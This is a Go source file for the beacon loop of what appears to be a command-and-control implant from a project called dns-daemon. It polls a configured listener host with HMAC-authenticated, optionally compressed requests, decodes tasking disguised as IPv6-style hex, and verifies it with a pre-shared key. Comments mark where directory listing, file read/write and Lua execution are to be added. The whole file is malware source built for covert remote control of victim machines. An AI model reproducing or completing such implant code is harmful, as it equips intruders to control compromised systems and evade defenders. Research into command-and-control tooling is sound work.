package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"time"

	"github.com/matt-culbert/dns-daemon/Implant/shared"
)

// Struct to hold the response format from the server
// The key is the HMAC used to verify the data retrieved using a shared secret
type ResponseData struct {
	Message string `json:"message"`
	Key     string `json:"key"`
}

// makeGetRequest makes a GET request to the given URL
// It takes in 3 parameters
// 1) The base URL to make the request to
// 2) The maximum number of retries before giving up
// 3) The query parameters to include in the request
// It returns the response and any error that occurred
func makeGetRequest(baseUrl string, maxRetries int, params url.Values) (*http.Response, error) {
	var resp *http.Response
	var err error
	reqURL, _ := url.Parse(baseUrl)
	reqURL.RawQuery = params.Encode()

	for attempts := 0; attempts < maxRetries; attempts++ {
		resp, err = http.Get(reqURL.String())
		if err == nil {
			// Success, return the response
			return resp, nil
		}

		// Log the error and retry after a delay
		//fmt.Printf("Error making GET request (attempt %d/%d): %v\n", attempts+1, maxRetries, err)
		attempts++
		time.Sleep(10 * time.Second)
	}

	// Return the last error after exhausting retries
	return nil, fmt.Errorf("failed to fetch URL after %d attempts: %w", maxRetries, err)
}

// The 4 byte ID for the implant to use set at compile time
var CompUUID string

func main() {
	// Load configuration from embedded data
	conf, err := shared.LoadConfig()
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	maxRetries := 3

	for {
		baseUrl := ""

		baseUrl = "http://" + conf.Listener + "/auth/" + CompUUID

		token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)

		//reqURL, _ := url.Parse(baseUrl)

		// Prepare the hmac params (timestamp and token)
		params := url.Values{}
		hardVals := fmt.Sprintf("timestamp=%s&token=%s", timestamp, token)

		// compedData is hardVals compressed using zlib
		// if enabled at compile time, DoComp returns the compressed object and bool true
		// if disabled (default) the function returns false
		// if false, the params are instead appended to the request uncompressed
		compedData, boolRes := shared.DoComp(hardVals)
		if boolRes {
			params.Add(string(compedData.String()), "")
		} else {
			params.Add("token", token)
			params.Add("timestamp", timestamp)
			//reqURL.RawQuery = params.Encode()
			//fmt.Println(reqURL.String())
		}

		// makeGetRequest 3 times with a 10 second delay between each attempt
		// if the request is successful, break the loop
		// otherwise, the 3 timeouts cause the program to exit
		resp, err := makeGetRequest(baseUrl, maxRetries, params)
		if err != nil {
			fmt.Println("Final error:", err)
			return
		}

		// Defer closing the response body until the for loop breaks
		defer resp.Body.Close()

		// Check the response status
		if resp.StatusCode != http.StatusOK {
			// non-OK http status
			break
		}

		// Read the response body
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			// reading response body failed
			break
		}

		// Parse the JSON response
		var data ResponseData
		err = json.Unmarshal(body, &data)
		if err != nil {
			// parsing json failed
			break
		}

		// Print the values (for testing)
		// fmt.Println("Message:", data.Message)
		// fmt.Println("Key:", data.Key)

		// The response comes encoded in a hex format that mimics IPv6 IPs
		// Decode that data
		decoded, err := shared.DecodeIPv6ToString(string(data.Message))
		if err != nil {
			fmt.Println(err)
			break
		}
		fmt.Println("Decoded string:", decoded)

		// Verify the message with the received HMAC
		if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
			fmt.Println("HMAC is valid!")
			// Here is where command processing should occur
			// A switch statement to run through possible command options, including using the lua engine
			// List arbitrary dir, read file, write file, execute Lua
			break
		} else {
			fmt.Println("HMAC is invalid or message was tampered with.")
			break
		}
	}
}
